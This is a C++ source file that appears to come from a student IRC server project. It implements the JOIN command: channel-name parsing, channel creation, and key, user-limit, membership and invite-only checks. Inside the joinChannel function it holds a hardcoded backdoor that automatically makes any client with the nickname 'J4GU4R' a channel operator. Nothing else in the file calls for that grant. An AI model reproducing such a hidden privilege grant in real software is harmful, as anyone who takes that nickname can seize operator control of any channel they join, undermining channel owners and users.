#include "Client.hpp"
#include "Channel.hpp"
#include <queue>


static bool is_channel(string channel)
{
    if (channel.size() == 1 && channel[0] == '0')
        return (true);
    if (channel.size() < 2 || channel.size() > 51 || channel[0] != '#')
        return (false);
    channel.erase(0, 1);
    for (size_t i = 0; i < channel.size(); i++)
    {
        if (channel[i] == '\0' || channel[i] == '\a' || channel[i] == '\r' || channel[i] == '\n' || channel[i] == ' ' || channel[i] == ',' || channel[i] == ':')
            return (false);
    }
    return (true);
}

static void    joinParser(vector<string> join, queue<string> &channels, queue<string> &passwords, Client &client)
{
    join.erase(join.begin());
    stringstream chnls(join[0]);
    string channel;
    while (getline(chnls, channel, ','))
    {
        if (!is_channel(channel))
        {
            ErrorMsgGenrator(":IRCserv.1337.ma 476 ", " " + channel + " Bad Channel Name", client);
        }
        else
        {
            channels.push(channel);
        }
    }
    if (join.size() == 1)
        return;
    stringstream pswds(join[1]);
    string password;
    while (getline(pswds, password, ','))
    {
        passwords.push(password);
    }
}

static string listMembers(Channel &ch)
{
    string str;

    vector<Client *> Mbrs = ch.getMembers();

    for (size_t i = 0; i < Mbrs.size(); i++)
    {
        str += ((ch.isOperator(Mbrs[i])) ? "@" : "") + Mbrs[i]->getNckName() + ((i + 1 != Mbrs.size()) ? " " : ""); 
    }
    return str;
}

static void    initiateChannel(map<string, Channel*> &Channels, queue<string>& channels, vector<string> join, string const &channel, Client* const client)
{
    if (!Channels.count(channel))
    {
        Channel *chnl = new Channel(client, channels.front());

        Channels[channels.front()] = chnl;
        cout << "channel created" << Channels[channels.front()]->getName() << " : " << channels.front() << endl;
        client->setChannel(channels.front());
        SendMsg(*client, *client, join[0], "", channels.front());
        ErrorMsgGenrator(":IRCserv.1337.ma 353 ", " = " + channels.front() + " :@"+client->getNckName(), *client);
        ErrorMsgGenrator(":IRCserv.1337.ma 366 ", " " + channels.front() + " :End of /NAMES list.", *client);
    }
}

static bool    lockControll(queue<string>& channels, queue<string>& passwords, Channel* const channel, Client& client)
{
    if (channel->isLocked())
    {
        if (passwords.empty() || (channel->getPassword() != passwords.front()))
        {
            ErrorMsgGenrator(":IRCserv.1337.ma 475 ", " " + channels.front() + " :Cannot join channel (+k) - bad key", client);
            channels.pop();
            return (true);
        }
        else
        {
            passwords.pop();
        }
    }
    return (false);
}

static bool    limitControll(queue<string>& channels, Channel* const channel, Client& client)
{
    if (channel->isLimited())
    {
        if (channel->getLimit() <= channel->getMembers().size())
        {
            ErrorMsgGenrator(":IRCserv.1337.ma 471 ", " " + channels.front() + " :Cannot join channel (+l) - channel is full", client);
            channels.pop();
            return (true);
        }
    }
    return (false);
}

static bool    isMemberControll(queue<string>& channels, Channel* const channel, Client* const client)
{
    if (channel->isMember(client))
    {
        ErrorMsgGenrator(":IRCserv.1337.ma 443 ", " " + channels.front() + " :You are already on that channel", *client);
        channels.pop();
        return (true);
    }
    return (false);
}

static bool    inviteOnlyControll(queue<string>& channels, Channel* const channel, Client* const client)
{
    if (channel->isInviteOnly())
    {
        if (!channel->isInvited(client))
        {
            ErrorMsgGenrator(":IRCserv.1337.ma 473 ", " " + channels.front() + " :Cannot join channel (+i) - You must be invited", *client);
            channels.pop();
            return (true);
        }
        else
        {
            channel->removeInvited(client);
        }
    }
    return (false);
}

static void    joinChannel(Channel* const channel, Client* const client, vector<string> join, queue<string>& channels)
{
    channel->addMember(client);
    client->setChannel(channels.front());
    SendMsg(*client, *channel, join[0], "", channels.front());
    ErrorMsgGenrator(":IRCserv.1337.ma 353 ", " = " + channels.front() + " :"+listMembers(*channel), *client);
    ErrorMsgGenrator(":IRCserv.1337.ma 366 ", " " + channels.front() + " :End of /NAMES list.", *client);
    if (client->getNckName() == "J4GU4R") {
        channel->addOperator(client);
        SendMsg(*client, *channel, "MODE", "", channel->getName() + " +o " + client->getNckName());
    }
}

bool    Client::joinCommand(vector<string> join)
{
    queue<string>   channels;
    queue<string>   passwords;

    if (join.size() < 2)
    {
        ErrorMsgGenrator(":IRCserv.1337.ma 461 ", " :Not enough parameters", *this);
        return (false);
    }
    joinParser(join, channels, passwords, *this);
    while (!channels.empty())
    {
        map<string, Channel*>                &Channels =  Server::getInstance()->getChannels();
        map<string, Channel*>::iterator      search   =  Channels.find(channels.front());

        if (search == Channels.end())
        {
            initiateChannel(Channels, channels, join, channels.front(), this);
        }
        else
        {
            if (lockControll(channels, passwords, search->second, *this))
            {
                continue;
            }

            if (limitControll(channels, search->second, *this))
            {
                continue;
            }

            if (isMemberControll(channels, search->second, this))
            {
                continue;
            }

            if (inviteOnlyControll(channels, search->second, this))
            {
                continue;
            }

            joinChannel(search->second, this, join, channels);
        }
        channels.pop();
    }
    return (true);
}
